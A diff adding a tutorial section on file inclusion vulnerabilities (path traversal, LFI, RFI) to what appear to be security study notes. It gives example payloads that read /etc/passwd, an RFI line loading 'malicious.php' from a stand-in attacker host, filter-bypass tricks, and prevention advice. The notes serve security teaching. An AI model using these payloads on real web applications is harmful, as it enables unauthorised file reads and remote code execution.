@@ -652,4 +652,78 @@ Understand how systems fail so you can:
 * Exploit (ethical hacking)
 * Defend (secure coding)
 
+# File Inclusion (LFI, RFI, Path Traversal)
+
+## Idea
+
+File Inclusion occurs when a web app loads files based on user input without proper validation.
+
+---
+
+## Path Traversal
+
+Use `../` to move directories and access sensitive files.
+
+Example:
+
+```
+?file=../../../../etc/passwd
+```
+
+---
+
+## LFI (Local File Inclusion)
+
+Includes files from the same server.
+
+Example:
+
+```
+?lang=../../../../etc/passwd
+```
+
+---
+
+## RFI (Remote File Inclusion)
+
+Includes files from external servers.
+
+Example:
+
+```
+?lang=http://attacker.com/malicious.php
+```
+
+---
+
+## Bypass Techniques
+
+* Null byte: `%00`
+* Filter bypass: `....//`
+* Current dir: `/etc/passwd/.`
+* Forced path: `languages/../../../../etc/passwd`
+
+---
+
+## Impact
+
+* Read sensitive files
+* Leak credentials
+* Remote command execution (RFI)
+
+---
+
+## Prevention
+
+* Validate input
+* Use whitelisting
+* Disable dangerous PHP functions
+* Never trust user input
+
+---
+
+## Summary
+
+File Inclusion = loading unintended files via user-controlled input
+
 
